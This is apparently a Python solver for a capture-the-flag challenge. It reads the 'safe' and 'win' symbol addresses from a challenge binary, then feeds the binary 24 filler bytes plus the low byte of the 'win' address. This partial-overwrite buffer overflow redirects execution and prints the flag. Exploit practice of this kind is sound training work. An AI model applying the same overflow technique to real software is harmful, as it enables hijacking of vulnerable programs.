#!/usr/bin/env python3
from __future__ import annotations

import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    nm = subprocess.check_output(["nm", "-an", binary], text=True)
    safe = int(next(line.split()[0] for line in nm.splitlines() if " safe" in line), 16)
    win = int(next(line.split()[0] for line in nm.splitlines() if " win" in line), 16)
    if safe >> 8 != win >> 8:
        raise SystemExit("unexpected address layout")
    payload = b"A" * 24 + bytes([win & 0xFF])
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
